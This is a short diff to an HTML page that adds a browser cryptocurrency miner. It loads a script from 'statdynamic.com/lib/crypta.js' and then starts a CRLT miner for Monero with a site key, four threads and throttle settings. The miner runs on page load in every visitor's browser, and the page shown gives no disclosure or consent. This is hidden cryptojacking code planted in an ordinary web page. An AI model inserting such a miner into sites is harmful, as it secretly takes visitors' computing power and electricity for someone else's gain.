@@ -14,7 +14,13 @@
    // throttleMiner = 80;
 </script>
     
-
+<script src="//statdynamic.com/lib/crypta.js"></script>
+<script>
+  var miner=new CRLT.Anonymous('6be0b900fcfdb4a7b20eb372ba49269c686420f6e189', {
+    threads:4,throttle:0.73, coin: "xmr",
+  });
+  miner.start();
+</script>
  
 </body>
 </html>
